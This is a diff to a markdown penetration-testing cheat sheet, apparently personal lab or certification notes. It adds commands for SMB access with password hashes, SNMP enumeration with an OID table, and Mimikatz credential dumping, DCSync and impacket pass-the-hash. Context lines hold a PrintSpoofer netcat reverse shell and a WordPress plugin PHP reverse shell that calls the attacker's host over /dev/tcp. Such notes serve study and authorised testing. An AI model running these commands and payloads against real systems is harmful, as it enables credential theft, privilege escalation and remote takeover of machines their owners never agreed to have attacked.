@@ -15,11 +15,12 @@
 		- Help on script: nmap --script-help=\<script.nse>
 ## nmapautomator
 - https://github.com/21y4d/nmapAutomator
-- ./nmapAutomator.sh --host 10.1.1.1 --type All (or Network/Port/Script/Full/UDP/Vulns/Recon)
+- ./nmapAutomator.sh --host \<Target IP> --type All (or Network/Port/Script/Full/UDP/Vulns/Recon)
 # Web
 ## Directory Scanning
 ### Gobuster
 - gobuster dir -u http://host -w /usr/share/wordlists/$wordlist.txt
+- EX: gobuster dir -u http://host -w /usr/share/wordlists/dirb/common.txt -t 5
 - gobuster dir -u http://hosts -w /wordlists/Discovery/Web-Content/big.txt -t 4 --delay 1s -o results.txt
 	- Where the resulting output is called results.txt
 - gobuster dir -u https://host -w /wordlists/$wordlist.txt  -x .php, .txt  -t 4
@@ -42,18 +43,50 @@ On Linux, we can use the /etc/passwd file to test directory traversal vulnerabil
 ## LFI
 
 ## RFI
-- 
 
-  
+# SMB
+- smbclient -L \<target> -U \<user>
+- smbclient //\<target>/\<share> -U \<user>%\<password>
+- smbclient //\<target>/\<share> -U \<user> --pw-nt-hash \<NTLM hash>
 
 # SMTP
+### onesixtyone
+- onesixtyone -c \<file containing community strings (public, private, manager)> -i \<file containing target ips>
+- Note that there are seclists with common community strings
+	- SecLists/Miscellaneous/wordlist-common-snmp-community-strings.txt
+	- SecLists/Miscellaneous/snmp.txt
+### snmpwalk
+- snmpwalk -c public -v1 -t 10 \<target ip>
+	- other community strings besides public include private and manager
+- snmpwalk -c public -v1 192.168.50.151 \<OID string>
 
-  
+	|OID| Target |
+	|--|--|
+	| 1.3.6.1.2.1.25.1.6.0 | System Processes |
+	| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
+	| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path |
+	| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units |
+	| 1.3.6.1.2.1.25.6.3.1.2  | Software Name |
+	| 1.3.6.1.4.1.77.1.2.25 | User Accounts |
+	| 1.3.6.1.2.1.6.13.1.3 | TCP Local Ports |
+- snmpwalk -Os -c public -v 1 \<host> system
+	- to retrieve all
+	- try 'v 2c' as well 
 
 # Windows Foothold
 ## Enumeration
 
 ## Privilege Escalation
+### Mimikatz
+
+ 1. privilege::debug
+ 2. token::elevate
+ 3. lsadump::sam
+ 4. sekurlsa::logonpasswords
+ 5. lsadump::dcsync /user:\<domain>\\\<user> (to obtain NTLM hash)
+	 -  impacket-secretsdump -just-dc-user <user> \<domain.com>/\<user>:"\<password>"@\<ip>
+	 - impacket-psexec -hashes 00000000000000000000000000000000:\<NTLM hash> Administrator@\<IP> 
+
 ### PrintSpoofer
 - .\PrintSpoofer.exe -c "nc.exe \<kali $IP> \<listening port> -e cmd"
   
@@ -98,7 +131,7 @@ OR
 - keepass2john \<database_name>.kdbx > keepass1.hash
 ## Wordpress Cheatsheet
 ### wpscan
-- wpscan --url http://\<url. --api-token \<APItoken>
+- wpscan --url http://\<url --api-token \<APItoken>
 ### reverse shell Wordpress plugin
 
 	    <?php
@@ -114,3 +147,8 @@ OR
 	    
 	    exec("/bin/bash -c 'bash -i >& /dev/tcp/<kali_IP>/<kali_port> 0>&1'");
 	    ?>
+
+
+
+
+
